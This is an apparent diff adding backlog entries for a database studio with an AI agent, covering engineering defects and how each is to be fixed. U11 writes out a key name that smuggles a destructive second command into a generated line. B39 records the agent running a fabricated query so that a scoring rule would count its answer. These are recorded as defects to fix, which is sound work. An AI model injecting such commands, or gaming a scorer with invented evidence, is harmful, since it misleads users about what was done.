+rail renders, the operator clicks Start, and the run fails when the world is built. That is precisely
+the failure T5 exists to prevent, surviving in a narrower case.
+
+T5 narrowed the promise rather than widening the probe: the docblock on `runLedgerProbe` and the HTTP
+surface section of [`AGENT.md`](AGENT.md) now say that green means `ensureDataDir` will pass, not that
+`initDataDir` will. Widening was rejected here on two grounds. Parsing another package's on-disk
+format in our own probe duplicates a contract that is upstream's to change. And the honest alternative
+— calling upstream's `initDataDir` — writes `version.txt` as a side effect, which turns a read-only
+visibility probe into something that initialises the ledger on every page load of a logged-in user.
+
+Done when the probe can answer for the version file without writing one: either upstream exposes a
+check that does not initialise (worth an issue there), or the probe reads an EXISTING `version.txt`
+itself and reports a `LEDGER_INCOMPATIBLE` reason distinct from `LEDGER_UNAVAILABLE`, leaving the
+absent-file case to the world.
+
+### B31. The Postgres durable backend is reported available without being contacted
+
+Raised in review of #331 T5.
+
+`resolveAgentAvailability` derives the agent's visibility from two conditions, and the second one —
+the durable ledger has a usable home — is only ever *tested* for the `local` backend, where testing it
+is a `mkdir` and a file write. With `WORKFLOW_TARGET_WORLD=@workflow/world-postgres` the ledger is a
+database, and the check ends at "the variable names a sanctioned backend". `WORKFLOW_POSTGRES_URL` is
+neither read nor reached, and unset it does not even refuse: the world falls back to a development
+default (`postgres://world:world@localhost:5432/world`).
+
+So a multi-replica deployment pointed at an unreachable, misspelled or unset Postgres URL gets a rail
+that renders, a Start that is offered, and a failure at the moment a world is built — the exact
+outcome deriving availability exists to prevent, surviving in the one backend an operator opts into
+deliberately.
+
+It is a **documented carve-out rather than a silent one**. `AgentAvailability`'s green branch carries
+`ledgerVerified`, `GET /api/agent/config` returns it, and this backend answers `false` — so no reader
+of the code, the API or [`AGENT.md`](AGENT.md) is told a database was reached when only a variable was
+read. What is *not* claimed is that the rail is therefore correct: it still appears.
+
+Not fixed here because the fix is a different piece of work with its own cost: the only real readiness
+check is a connection attempt, and this route answers on every page load of a logged-in user, from
+outside the `ai` rate-limit bucket. Done when the Postgres backend's readiness is established by a
+bounded, cached connection attempt under its own reason code — `LEDGER_UNREACHABLE`, distinct from
+`LEDGER_UNAVAILABLE`, which names a directory — with a timeout short enough for a page load and a memo
+long enough that a page-load probe cannot become a connection per request. B16 gates any of this being
+testable in a shipped artifact: the Postgres world is not in the container image or the npx payload.
+
+### B32. The route-documentation guard covers the agent family and nothing else
+
+`docs/API_DOCS.md` now documents `/api/agent/*` request-by-request, and
+`tests/unit/agent-documentation.test.ts` derives the six agent paths from `src/app/api/agent/**` and
+fails if one of them is missing from that file — which is what closed the gap the agent family had
+(#331 T6). The guard is deliberately scoped to that one family, so **every other route family is
+still documented by hand with nothing comparing it against the route tree.** A new `/api/db/*` or
+`/api/storage/*` route can ship undocumented exactly as `/api/agent/*` did, and no gate notices.
+
+The narrow scope was a choice rather than an oversight: widening the derivation to `src/app/api/**`
+turns up routes the reference documents in prose rather than under a literal path heading (the
+schema family reaches two paths through one shared handler, and several `/api/db/*` routes are
+described in a single table row), so the assertion would fail on documentation that is not actually
+missing. Making it total means first deciding what "documented" means for a route the reference
+covers collectively — a documentation-shape decision, not a test.
+
+Done when the guard derives every family from `src/app/api/**` under one stated rule for what counts
+as documented, and the reference is reshaped where that rule does not currently hold. It is also
+worth noting what the guard does NOT check even for the agent: that a documented request or response
+shape still matches the handler. Only presence is asserted.
+
+### B33. An agent run is observable only from its own ledger — nothing exports it
+
+A run's whole record is the append-only ledger: lifecycle, tool invocations, refusals with their deny
+class, budget counters and the goal verdict. The rail and the eval harness both read runs out of it,
+and an operator debugging a run today reads it directly. What does not exist is a way to get that
+record into the observability stack a self-hosting team already runs — no OpenTelemetry spans, no
+OTLP export, no metrics.
+
+Designed in full and deliberately not built (#332, closed 2026-08-14): endpoint-gated activation on
+`OTEL_EXPORTER_OTLP_ENDPOINT`, a dynamic import so no exporter module loads while it is unset,
+metadata-only span attributes by default with a documented verbose delta, and no second global SDK
+registration in the embedded build. The reason it is deferred is dependency surface and timing rather
+than doubt about the design: it adds `@ai-sdk/otel` plus an exporter to a package libredb-platform
+also consumes, and the agent's event model is still gaining kinds — instrumenting it now means
+maintaining a span catalogue against a moving target. Nothing in Phase 1 depends on it and no user is
+waiting on it.
+
+Done when the event model has settled and somebody is running Studio beside a stack that wants agent
+runs in it. The decisions above are the starting point; #332 holds the full scope.
+
+### B34. A hydrated agent result cannot be exported, because Export serializes the tab's own rows
+
+The half of the old B14 that did not land with the chart surface, restated on its own because the two
+halves were never the same problem. A run's rows now reach the results grid, the explain view and the
+charts view, each with the provenance badge naming the run — but `exportResults` in
+`src/components/Studio.tsx` serializes `currentTab.result`, so offering the Export menu over a
+hydrated view would write the tab's rows to a file while the user is looking at the run's. The menu is
+therefore hidden while an artifact is shown, which is correct and is not the same thing as being able
+to export what is on screen.
+
+The pivot and dashboard views are unhydrated for a related reason and are not part of this: both are
+configured against the columns of the result they were opened on, and neither has a recorded decision
+behind it the way a composed answer has.
+
+Done when the export path can take an explicitly hydrated result — with the file still attributable to
+the run, since an exported file that came from an agent run and is indistinguishable from one the user
+ran is the thing to avoid.
+
+### B35. A resumed run can evict its own still-cited results, because the artifact cap is sized per drive
+
+`AGENT_MAX_ARTIFACTS` (`src/lib/agent/runtime.ts`) is `45 × 4 = 180`: the largest per-workflow
+statement ceiling times the four concurrent runs one agent process is sized for. Its justification
+used to be that "a run cannot produce more artifacts than it is allowed statements", which is true of
+a DRIVE and not of a run — every ceiling in `AGENT_WORKFLOW_BUDGETS` is per drive (B6), while a
+resumed run keeps its `runId` and its artifacts are keyed by it. A run driven three times may
+therefore hold up to three times its statement ceiling in the store, and one long-lived run can pass
+180 on its own without any concurrency at all.
+
+`ExecutionArtifactStore.put` spends the cap run-fairly: a store at the cap evicts the oldest artifact
+of the run that is STORING, which is what stops a busy run making "Show result" fail on a quieter one.
+Applied to a run past the cap, the same rule means the run evicts its own earliest evidence — the
+results its first drive read, which its report may still cite. Nothing about the ledger is wrong
+afterwards: a claim and its citation are durable, and the artifact route already answers "the rows are
+not here" for the run-ended and TTL-expired cases (B15). This is a third way to reach that answer, and
+the only one that can happen while the run is still live and the rail is still offering the control.
+
+Not closed with an artifact-only bound, deliberately. A ceiling that holds ACROSS drives is exactly
+the mechanism B6 describes as missing, and the run record already carries what it needs
+(`createdAtMs`, and a ledger holding every settled step), so a second answer invented for artifacts
+alone would have to be unpicked when B6 lands. It also cannot be closed by raising the number: a run
+resumed often enough passes any constant.
+
+Done when a drive's artifact allowance is derived from the run's own history rather than from a
+per-drive constant — most likely as part of B6 — with a test that drives one run twice past the cap
+and shows the first drive's cited results still readable, or the surface stating that they are not.
+
+### B36. A follow-up question is answered as if it were the first one
+
+Driven live on 2026-08-15. An analysis run answered "compare the average salary of employees hired
+before 1990 with those hired after" correctly. The next question typed into the same box — "and how
+many of those employees are there in each group?" — was answered about DEPARTMENTS: nine of them,
+289 in Development. "Those groups" had no referent, because a run carries none: `start()` clears the
+entries and opens a fresh ledger, and the model is handed the objective and the schema and nothing
+else.
+
+The defect is not that runs are independent. It is that the surface does not say so, and the model
+does not either — it silently picks a plausible referent and answers a question nobody asked, with
+the same confident citations a correct answer carries. A user reading the report cannot tell the
+difference without re-reading their own question.
+
+Two shapes would close it and they are not the same feature. The smaller: let a run be TOLD about
+the run before it — its objective and its report — as fenced context, so "those groups" resolves or
+is honestly refused. The larger: run history, so a user can see and return to earlier runs (the
+objective box being emptied after a run, which landed with this PR, at least stops the surface
+reading as a conversation).
+
+Neither should be built by threading the browser's memory into the prompt: a resumed drive would not
+have it, and the context a run reasons from has to live where the run does.
+
+Done when a follow-up either resolves against the previous run or is refused for lack of a referent,
+with an eval that drives two runs and asserts the second does not answer a different question.
+
+### B37. A malformed seed config disables the agent everywhere, and blames the connection
+
+Driven live on 2026-08-15. A `seed-connections.yaml` missing a required field made
+`GET /api/connections/managed` throw. The browser then held an empty `servedSeeds`, so
+`resolveAgentRunConnectionId` returned null for EVERY connection — including the two samples this
+application ships and seeds itself — and the rail said:
+
+> "Sample (Employees) cannot be rebuilt on the server: its settings live in this browser."
+
+Which is false twice over. The connection is a seed, its settings live on the server, and what
+actually happened is that the server could not read its own config. The true cause appeared in the
+server log and nowhere a user can see. The rail is stating a conclusion drawn from an absence it
+cannot distinguish from a failure — the same shape as an unreadable plan reading as a cheap one
+(#373), and it costs an operator the whole agent surface while pointing them at the wrong file.
+
+Done when the browser can tell "the server served no seeds" apart from "the server could not load
+its seeds", and the rail says the second one differently — with a test that fails the managed
+endpoint and asserts the copy names the server's configuration rather than the connection.
+
+### B38. A run is offered on an engine that cannot run it, and refuses only after a model turn
+
+Driven live on 2026-08-15. Starting an agent run on the bundled `libredb` sample opens the run,
+captures nothing, drafts a statement, invokes `run_read_query` and then ends `failed` with
+`engine-unsupported`: "The agent cannot run on this database engine: it offers no read-only
+execution profile." The sentence is exact and the failure is honest. It is also entirely
+predictable before the run: `queryReadOnly` is a property of the provider, known from the
+connection's type, and nothing about the objective can change it.
+
+One clause of that observation expired with #414 and the defect did not: a run on that connection no
+longer "captures nothing" — the capture reads the provider's own schema, on this engine and on the
+other eight, and succeeds. So the run now spends a model turn AND is grounded in a schema it will
+never be allowed to read a row of, which makes the offered-then-withdrawn shape worse rather than
+better. The fix is unchanged.
+
+So a user spends a model turn and a run id to be told something the rail could have said while the
+Start button was still grey. This repository already follows the opposite rule everywhere it
+matters — `HydrationControls` renders no control the host cannot serve, the stop button is absent
+rather than disabled, and `canHandOver` withholds the auto-execute checkbox from a host with no
+runner. Agent mode on an unsupported engine is the one place a capability is offered and then
+withdrawn after it was taken up.
+
+The telling half landed with the rail redesign (2026-08-21) and the defect did not. The safety strip
+now reads *Cannot execute on `<engine>`* before anything is started, an amber pre-start card
+(`agent-engine-unsupported-notice`) carries the same facts with a **Switch to Plan** button, and both
+are pinned by tests. What did NOT land is the second clause of the original "done when", and it was
+refused rather than deferred: **Start must stay live**, because the `operations` workflow sends no
+statement at all and runs on every engine (#411), so a disabled Start would withhold a workflow over
+a claim that is not true of it. So a user who starts an analytical run there is now warned first, and
+still spends a model turn and a run id to reach `engine-unsupported`.
+
+Done when an agent run whose workflow needs a read-only statement path is refused on such an engine
+at the point the run is opened — from the connection's own type, with the sentence the rail already
+shows, and without a run id or a drive turn being spent — while a workflow that sends no statement
+still opens there. The workflow has to be known first, so under **Automatic** the refusal lands after
+the classify call and before the open; that call is ceilinged separately and is not the turn this
+entry is about. Tests: the refusal itself, an operations run still opening on the same connection,
+and no drive reaching the model.
+
+### B39. An analysis run cannot say "this database cannot answer that" without fabricating a read
+
+Driven live on 2026-08-15. Asked "what is our customer churn rate this quarter?" against an
+employees database, the run answered honestly: the schema holds employee records, not customer
+records. To do so it executed
+
+```sql
+SELECT 'The database contains employee records (employee, department, dept_emp, salary, title) ...'
+```
+
+— a string literal, run purely to produce the `sql.query.read` artifact that `present_answer`
+requires and `agent-data-analysis.1` scores on. The run took 36 steps to get there.
+
+The user-visible outcome is correct and readable, which is why this is recorded rather than fixed in
+haste. The mechanism is not: the workflow's only route to `answered` is a reading of the data, so a
+question the data cannot answer has no honest route at all, and the model games the rule instead of
+reporting the finding. This is the #356 family — a bar only one kind of correct answer can clear —
+and the remedy is the same shape: a second arm. A run that establishes from the schema snapshot that
+the question is not about this database has answered it, and should be able to say so without
+inventing a query.
+
+Done when a data-analysis run can conclude "not answerable here" and be scored `answered` for it,
+with the rule stated in `WORKFLOW_TOOL_RULES` (a rule the model is not told is a rule live runs
+fail) and an eval that asserts no fabricated statement is sent.
+
+### B40. `bun dev` cannot log in, because the CSP omits `unsafe-eval` in every environment
+
+`securityHeaders` (`src/lib/security/headers.ts`) deliberately omits `unsafe-eval`, which is right
+for production and correct for Monaco. React's DEVELOPMENT build needs it, and without it the login
+page never hydrates: the Sign In button has no handler, no request reaches `/api/auth/login`, and
+the console carries only "eval() is not supported in this environment". A contributor's first
+`bun dev` is a dead end unless they already hold a session cookie from a production run — which is
+why this has gone unnoticed.
+
+Production is unaffected and nothing here argues for weakening the shipped policy. The fix is to
+relax the directive only where `NODE_ENV === "development"`, in one place, with the reason written
+next to it.
+
+Done when `bun dev` can log in from a cold browser profile, with a test asserting the shipped
+(non-development) policy still omits `unsafe-eval`.
+
+### B41. `defaults` in a seed config does not merge `roles`
+
+`docs/SEED_CONNECTIONS.md` says the `defaults` block is "merged into every connection". A config
+whose `roles` appears only under `defaults` is rejected with
+`Invalid seed config: connections.0.roles: expected array, received undefined`. Either the merge is
+narrower than the sentence, or the sentence is wrong; a config file is not the place to find out by
+experiment.
+
+Done when the documented behaviour and the schema agree, whichever way is chosen, with a test
+covering a config that sets `roles` only in `defaults`.
+
+### B43. Nine copy call sites outside the agent rail fail silently on plain HTTP
+
+`navigator.clipboard` is a secure-context API: over plain HTTP on any host but loopback it is
+`undefined`, and this product ships that way on several distribution channels — the trap already
+recorded for `crypto.randomUUID` in `use-query-execution.ts`. `src/components/copy-button.tsx`
+(#389) handles it by falling back to `document.execCommand("copy")` and reporting a failure of both,
+but it is used only by the agent rail. Every other copy in the app reaches the API unguarded — nine
+call sites across seven components: `TableItem.tsx`, `RowDetailSheet.tsx` (three: one per field, two
+on the whole-row path), `CodeGenerator.tsx`, `TestDataGenerator.tsx`, `DataImportModal.tsx`,
+`StudioMobileHeader.tsx` and `QueryEditor.tsx`.
+
+Four of the seven claim a success nobody observed, in the same statement that starts the write:
+`CodeGenerator`, `TestDataGenerator` and `RowDetailSheet` flip a label, and `TableItem` raises a
+`toast.success`. On those channels the user is told the copy worked and finds out when they paste.
+
+Done when every copy in the app goes through `CopyButton` (or its `writeToClipboard`), with a test
+per site that the label does not claim success when the write was refused.
+
+### B44. Under the documented least-privilege role no foreign key is visible, and the run then asserts that none exists
+
+Found on 2026-08-17 while re-driving `docs/AGENT_DEMO.md` in a browser. Two halves, and the second
+is the one that reaches a user.
+
+**The read comes back empty.** `composePostgresRelations` (`src/lib/agent/composed-sql.ts`) reads
+`information_schema.table_constraints` / `key_column_usage` / `constraint_column_usage`. PostgreSQL
+restricts those views to constraints on tables the current role owns or holds a privilege on
+*other than* `SELECT`, so the role `docs/AGENT_DEMO.md` prescribes for the agent — `CONNECT`,
+`USAGE`, `SELECT ON ALL TABLES`, `pg_read_all_stats` — sees none of them. Measured on the seeded
+dvdrental as `libredb_agent` (`usesuper = f`): `information_schema.table_constraints` returns **0**
+rows with `constraint_type = 'FOREIGN KEY'`, while `pg_constraint WHERE contype = 'f'` holds **18**.
+The relations graph packed into the run's context is therefore empty for the exact role the product
+tells operators to create.
+
+**The run then asserts the negative.** Asked what tables exist and how they relate, an investigation
+run answered *"There are no declared foreign key constraints between tables in the database"* —
+false, and cited to a schema snapshot that genuinely contained nothing. A zero-row relations read
+cannot distinguish "this database declares no foreign keys" from "this role cannot see the ones it
+declares", and nothing today makes the run say which it means. The neighbouring case survived only
+because the model reconstructed the join path from column names, which is luck, not evidence.
+
+The first half is **B8's rewrite arriving for a second reason**: B8 already plans to leave
+`information_schema` for `pg_constraint` — unnesting `conkey`/`confkey` `WITH ORDINALITY` — to pair a
+composite key's columns and to stop two same-named constraints cross-matching. `pg_constraint` is
+readable by any role with `USAGE` on the schema, so that same rewrite closes this too. What this
+entry changes is B8's severity: it was filed as a **precision** defect on the edges the inventory
+draws, and this makes it a **correctness** defect on whether the inventory has any edges at all.
+
+The second half is a separate decision and does not go away with the rewrite, since any role can
+still be narrower than the database. Done when a run on a `SELECT`-only role reports this database's
+foreign keys, **and** an empty relations read no longer licenses "there are no foreign keys" — the
+run either says it could not see them or says nothing about them, with a test that pins the
+distinction.
+
+### B45. Every optimization run is scored `unanswered / empty-evidence`, including one that produced a correct index
+
+Driven live on 2026-08-17. A query-optimization run compared plans with real PostgreSQL costs,
+recommended a `CREATE INDEX` that is the right index, offered it to the editor — and ended
+*"Run did not answer — Every result the report cited came back empty, so the answer rests on
+nothing."* Every Optimize run in that drive ended the same way.
+
+Two mechanisms compose into it. The plan artifact a run cites is `sql.explain.estimate`, and a plan
+arrives in a single column, so the artifact's summary records `rowCount: 0` — the artifact is
+complete and its row count is meaningless. And `verifyOptimizationGoal` composes on the investigation
+baseline, which carries the `empty-evidence` arm: every cited result returning zero rows ends the run
+unanswered.
+
+**This is structurally the same error the operations template was explicitly exempted from, and the
+exemption's own rationale applies verbatim.** `src/lib/agent/goal-verifier.ts:440-452` argues that
+holding an operational reading to the emptiness rule is "precisely backwards" — "no session is
+blocked" and "no index is unused" are answers, and marking a healthy server's run unanswered is "the
+same error as demanding an artifact only some valid answers can produce" (the #356 family). A plan
+with zero rows in it is the same shape: emptiness is a property of how a plan is returned, not of
+whether the question was answered.
+
+The user-visible cost is worse than a wrong label, because the verdict is the one part of a run a
+sceptical reader trusts most: the product contradicts its own good answer, in its own voice, at the
+end of the run.
+
+Done when an optimization run whose report cites a plan and recommends an index is scored `answered`,
+either by exempting `sql.explain.estimate` from the emptiness arm or by not composing that arm into
+this template — with an eval that fails if the run above reads `unanswered`, and with the reason
+recorded next to the operations exemption so the two read as one decision.
+
+### B47. `engine-unsupported` is shown for a misconfigured agent credential, on an engine that is supported
+
+`AgentRunFailureReason`'s `engine-unsupported` is rendered as *"The agent cannot run on this database
+engine: it offers no read-only execution profile."* (`src/components/agent/timeline.ts`). It is the
+classification `src/lib/agent/runtime.ts` gives to any `ExecutionProfileError`, and that error has two
+causes rather than one. The engine-shaped cause is real and the sentence fits it:
+`acquireExecutionProfileProvider` refuses `agent-read-only` for a provider with no `queryReadOnly`.
+The other cause is `resolveAgentCredential`, which throws the same error type — with reason codes
+`AGENT_CREDENTIAL_UNRESOLVABLE` and `AGENT_CREDENTIAL_WITH_CONNECTION_STRING` — for a credential that
+is half-configured, sealed under a key that no longer decrypts, or configured alongside a connection
+string. That check runs before a provider is created, on every engine.
+
+So an operator who set `agentUser` and `agentPassword` on a PostgreSQL connection and then rotated the
+secret key is told their engine is unsupported. The one message they get points away from the one
+thing they could fix, and it says something about their database that is false. Found while verifying
+this reason's own doc comment on #411; the comment now states the gap rather than claiming the
+workflow cannot reach it.
+
+Not made by #411 and not fixed by it. Every workflow could already reach it through
+`acquireExecutionProfileProvider` on the reading path; what #411 changed is that an `operations` run
+can now reach it before its first turn, during the grounding capture, which is the earliest and least
+explicable moment for it to arrive.
+
+Done when a credential refusal is classified apart from an engine refusal — the reason codes already
+distinguish them, so this is a branch in `classifyDriveFailure` and a second rail sentence, not new
+information — with a test per cause pinning the sentence a user is shown.
+
+### B48. The composed grounding path still loses a plan run to an environment failure
+
+`captureFromProvider` (`src/lib/agent/context-snapshot.ts`) converts a `DatabaseError` or an
+`ExecutionProfileError` raised before the reading leaves into an unavailable capture, so a plan run on
+one of the nine provider-path engines survives an unreachable host, a wrong password or a
+half-configured `agentUser` and answers ungrounded with the capture's own diagnosis. The composed path
+— PostgreSQL and SQLite — does not: the same failure propagates out of `readCatalogForGrounding`,
+through `captureContextSnapshot` and `establishPlanningContext`, and ends the run `internal`, or
+`engine-unsupported` on the profile error (see B47).
+
+The asymmetry was deliberate at #414 and is recorded here rather than resolved there: those two
+engines have never reached the new line, and changing their failure mode is a second decision about a
+path #414 did not touch. It is still an asymmetry a reader will trip over — two grounding paths, one
+of which loses the run to an unreachable database and one of which does not.
+
+Done when a plan run on PostgreSQL or SQLite whose catalog read cannot reach the engine answers
+ungrounded with the reason, exactly as the provider path now does, with a test per converted class.
+
+### B49. A LibreDB connection can never be grounded, because the file takes an exclusive lock
+
+A plan run on the seeded `Demo (LibreDB)` connection (`data/demo.libredb`, type `libredb`) is
+ungrounded on every attempt: it writes no `context-captured` event at all and answers with the
+refusal it is instructed to give — "this run was given no inventory of this database". The provider
+path reaches this engine like the other eleven, so the reading is attempted; it simply cannot open the
+file.
+
+Measured on 2026-08-17, against `@libredb/libredb` 0.2.2 and a copy of the seeded file:
+
+- `lib.open({ path })` takes an **exclusive lock**. Opening the same path a second time in the same
+  process throws `LibreDbError` with `code: "LOCKED"` (`libredb: <path> is locked`).
+- `acquireExecutionProfileProvider(connection, "agent-operations")` is a **second provider**, cached
+  under `profiledCacheKey(connection.id, profile)` rather than under the connection id, and it calls
+  `connect()` — which is `lib.open()` on a path the ordinary writable provider already holds open
+  (`LibreDBProvider.connect`, `src/lib/db/providers/embedded/libredb.ts:177`).
+- Driven end to end: with the writable provider connected and returning five namespaces
+  (`config:*`, `people:*`, `project:*`, `users:*`, `session:*`), the profiled acquisition fails with
+  `ConnectionError` / `CONNECTION_ERROR` and the message the provider writes for `LOCKED` — *"LibreDB
+  file is already open by another process (exclusive lock)."*
+- `ConnectionError` extends `DatabaseError`, so `captureFromProvider` converts it into an unavailable
+  capture rather than propagating it. The run therefore continues, honestly, ungrounded — which is
+  why nothing about this looks like a failure anywhere.
+
+The condition is "the connection's ordinary provider is currently connected", which is true from the
+moment anyone browses the connection in the sidebar — so in practice this is every run. It is not a
+grounding defect: the same lock defeats any second handle on the same file, which is why
+`docs/BACKLOG.md` D3 already records the connection-test modal presenting it as a failed connection.
+
+LibreDB is not a priority, so this is recorded rather than fixed. Done when an execution-profile
+acquisition on a single-writer embedded engine reuses the connection's existing provider instead of
+opening a second handle — the same answer D3 needs, and the reason the two entries should be closed
+together — with a test that grounds a plan run on a `libredb` connection whose writable provider is
+already open.
+
+### B50. A grounded Redis plan still drafts `KEYS`, the one command this product refuses to use itself
+
+Two plan runs on the seeded local Redis, driven after #414's vocabulary work landed, both grounded on
+the same 17 real key prefixes the provider read:
+
+- `arun_492bf2a7228e47e48f0caafa4da5d057`, objective *"Which key prefix holds the most keys, and how
+  would I list them?"* → **NO STATEMENT**, and the refusal is a good one: *"The inventory shows key
+  patterns like `user:*`, `order:*`, etc., but does not provide row counts or key counts for each
+  prefix, so it is impossible to determine which key prefix holds the most keys from the available
+  data."* Before the vocabulary fix the same objective produced `KEYS user:*` as though it were an
+  answer.
+- `arun_7f8ef0bb38e842c087a65cfc674e78d5`, objective *"How many users are stored, and how do I look
+  one up?"* → drafted `KEYS user:*`, with the rationale *"The key pattern `user:*` stores the user
+  records as hashes. The `KEYS user:*` command retrieves all keys matching that pattern, allowing you
+  to count them, and you can look up an individual user with `HGETALL user:<id>` using their specific
+  key."*
+
+Grounding is working, and the second half of that rationale is the new rule working exactly as
+designed: it names a WHOLE KEY (`HGETALL user:<id>`) rather than handing a derived grouping to a
+command. This is a draft-QUALITY matter, not a grounding one, and it should not be read as evidence
+against #414.
+
+What is wrong is the first half. `KEYS` is the blocking O(N) command this product's own provider
+deliberately refuses to use: the schema read is a non-blocking `SCAN` and never `KEYS *`
+(`docs/providers/redis.md`, and `CLAUDE.md` states it as a rule). So the product reads the keyspace
+safely, and then offers the user the unsafe way to do the same thing — with an Apply-to-editor button
+on it. Nothing runs: plan mode executes nothing and has no tools, so reaching the hazard takes the
+user applying the draft and running it themselves on their own connection.
+
+The open question, and it is genuinely open. The owner deliberately deferred per-engine knowledge
+files, and the derived-groupings rule was written to stay on the near side of that line — it says what
+the inventory's rows ARE and names no command, which is pinned by a test ("it names no command and
+forbids none", `tests/isolated/agent-investigation.test.ts`). One sentence about operational COST is a
+different kind of statement from a ban on a named command, and it may belong in the rules. Against it:
+a rule that bans one command by name is engine trivia that goes stale, says nothing about the next
+command, and this repository has been bitten by exactly that before — a model that knows what the rows
+are can choose for itself, which is the premise the whole grounding design rests on. The third
+position is that this is the user's call: the draft is theirs to run, on their own connection, and a
+product that reads for them does not have to think for them.
+
+Not decided here. Done when the owner rules, and — whichever way — the reason is recorded next to the
+derived-groupings rule so the two read as one decision.
+
+### B51. The run loop nudges a model three times and records none of it, so a rescued run is indistinguishable from one that never needed rescuing
+
+`runInvestigation` now delivers three notices, each one-shot per DRIVE, each with its own boolean,
+its own guard set and its own delivery mechanism:
+
+| Notice | When | Delivered as |
+| --- | --- | --- |
+| `AGENT_REPORT_RESERVE_NOTICE` | within the turn or time reserve of a ceiling | a `user` message, riding the turn about to be taken |
+| `AGENT_REPORT_REMINDER_NOTICE` | a prose turn after a tool this run holds was called | a `user` message, and the turn is taken again |
+| `AGENT_PRESENT_BEFORE_REPORT_NOTICE` | a `compose_report` on an answering workflow with a presentable read and no presentation | a `tool` result, INSTEAD of running the call |
+
+None of the three writes to the ledger. `service.recordEvent` is called for the schema capture, the
+drafted statement, the closing prose, the recommendation, the answer and the report — and for nothing
+the server said to the model. So a run's timeline shows a model that read, narrated, and then
+reported, with no entry anywhere saying it was told to report; and a `compose_report` the loop
+withheld leaves no record that a call was made at all.
+
+**"Once" means once per drive, and the missing entry is why.** All three booleans are `let`s inside
+`runInvestigation` (`src/lib/agent/investigation.ts`, beside `let turns = 0`), and that function is
+what RESUMES an already-running run — `service.resume` at its head distinguishes a queued run from
+one a dead process left running. A resumed drive therefore starts with every flag false and can
+deliver a notice the previous drive already delivered. Two of the three have a partial durable guard
+by accident: the present-before-report notice reads `answer-composed` off the ledger, so a run that
+presented is not told to again — but a run whose `present_answer` was REFUSED writes no event, and is.
+Nothing bounds the report reminder or the reserve notice across a resume at all. Recording delivery is
+what would make "once" mean once, which is why this is one entry and not two.
+
+That is a measurement problem before it is a design one. `docs/llms/` is built by reading run ledgers
+out of `.workflow-data`, and its whole claim is that each figure comes from an observed run. After
+#416 and #417 a ledger can no longer answer "did this model do that by itself?" — which is the exact
+question those pages exist to answer, and the question that decides whether a nudge is worth keeping.
+`methodology.md` already warns that one run per cell is the weakest part of the method; an
+unattributable rescue is weaker still, because re-running does not reveal it either.
+
+The second half is the shape. Each notice's GUARDS are the load-bearing part, and they are the part
+that keeps being got wrong: #416 arrived without the tool-set bound (a planning run, which holds no
+tools, was told to call `compose_report`) and without the turn bound (a run narrating at the ceiling
+was turned from `succeeded` / `model-stopped` into `failed` / `turn-limit`); #417 arrived with a
+condition that named "a result this run can present" and read an operation id that `inspect_schema`
+shares. Both were caught in review rather than by a gate, and a fourth notice will be written by
+someone reading the third.
+
+Done when a delivery is an entry on the ledger — one event kind, carrying which notice and what the
+run had done when it arrived — read back at the head of a drive so a resumed run is not told twice,
+and the three share one declared shape, so a new one states its condition, its scope and its delivery
+in the same place rather than inventing them again. Whether
+the rail SHOWS the entry is a separate question and probably a no: the notices exist to be invisible
+to a user, and the timeline is not the same surface as the ledger.
+
+### U11. The LibreDB "Scan Keys" generator interpolates a newline-bearing key name raw
+
+`generateSelectQuery`'s LibreDB branch refuses to emit a command line for a node whose name contains a
+newline (#427), because a line-oriented grammar cannot address it and a generated line would otherwise
+carry attacker-chosen text into the tab. `generateTableQuery` — the "Scan Keys" action, which
+`handleTableClick` AUTO-EXECUTES — was left as it was: for a key literally named
+`x\ndelete billing:2024` it returns `get x\ndelete billing:2024`. Only `get x` runs, because
+`firstCommandLine()` takes the first line, so nothing destructive executes and nothing is deleted; but
+line 2 sits in the editor as a plausible, runnable `delete billing:2024`, one Run Selected away.
+
+Redis's equivalent path is closed: an argument the plain tokenizer cannot round-trip switches that line
+to the lossless JSON command form, which has no line-oriented escape at all. LibreDB has no such form,
+so closing this needs either a quoting rule in its grammar or the same "emit a note, emit no command"
+answer `generateSelectQuery` already gives.
+
+Done when no generated LibreDB line can carry a second command, and `docs/providers/libredb.md` §5.3
+says so for Scan Keys as well as for the cheatsheet — today it claims the stronger property for both.
+
+### U12. The monitoring Queries tab tells every engine to enable `pg_stat_statements`
+
+`src/components/monitoring/tabs/QueriesTab.tsx:113,123` hardcodes PostgreSQL's advice as the empty
+state for "Slowest Queries": a badge reading *"pg_stat_statements required"* and the line *"Enable
+pg_stat_statements extension to see query stats."* Nothing gates it on the engine, so it renders on
+every connection whose `getSlowQueries()` answered nothing — measured in the browser on 2026-08-19 on
+an **OpenSearch** connection, and by inspection it is the same on MySQL, Oracle, SQL Server, MongoDB,
+Redis, Couchbase, ClickHouse, Druid and Elasticsearch.
+
+This is the #427 defect in another panel: six global `ProviderLabels` fields existed, were set by
+seven providers and read by no component, so every engine rendered Postgres's copy. That one was
+fixed by reading the labels; this one has no label to read.
+
+Done when the empty state names something true for the connected engine — a slow-query label on
+`ProviderLabels`, defaulted to today's wording for `postgres` alone — and each provider whose slow-log
+lives outside the query surface says so in its own words (the search providers' is "the SQL surface
+does not reach the slow log", already written in `docs/providers/elasticsearch.md` §7).
+
+### U13. BEGIN and SANDBOX render on engines that have no transactions
+
+`Studio.tsx` supplies `onBeginTransaction`/`onCommit`/`onRollback` unconditionally, so `QueryToolbar`
+renders the trio (and SANDBOX, which auto-rolls-back through the same route) on every connection.
+`POST /api/db/transaction` then refuses with *"Transaction control is not supported for this database
+type"* — measured 2026-08-19 on OpenSearch, HTTP 400 for both `begin` and `rollback`. Elasticsearch,
+Druid, Couchbase, MongoDB and Redis are in the same position.
+
+The toolbar's own doc comment already states the rule this breaks: *"A caller that cannot run
+transactions omits all three"* — added by #427 when the embedded shell was showing three dead buttons.
+The standalone shell now does the same thing for a different reason: there is no capability to gate on.
+The server gates on `isTransactionProvider(provider)`, a runtime shape check no client can read, and
+`ProviderCapabilities` has no `supportsTransactions`.
+
+Done when a provider declares whether it has transactions, `Studio.tsx` omits the trio and the sandbox
+toggle where it does not, and every provider's doc states its answer. Deliberately not
+folded into #424: the capability has to be added to every provider at once, which is a wider change
+than the PR that found it.
+
+### U15. The IPv6-only container default is unverified on a kernel without AF_INET6
+
+The container no longer hardcodes `0.0.0.0`. Its entrypoint resolves a bind address at startup,
+proves `::` is dual-stack by connecting an IPv4 client to a throwaway `::` listener, and falls back
+to `0.0.0.0` only when that probe fails and a non-loopback IPv4 address exists. The chart writes an
+empty `HOSTNAME` so the resolver runs, with `config.bindAddress` to overrule it. That closes #432
+and the original entry here.
+
+One branch of the resolver is reasoned rather than measured. Every namespace reachable on the
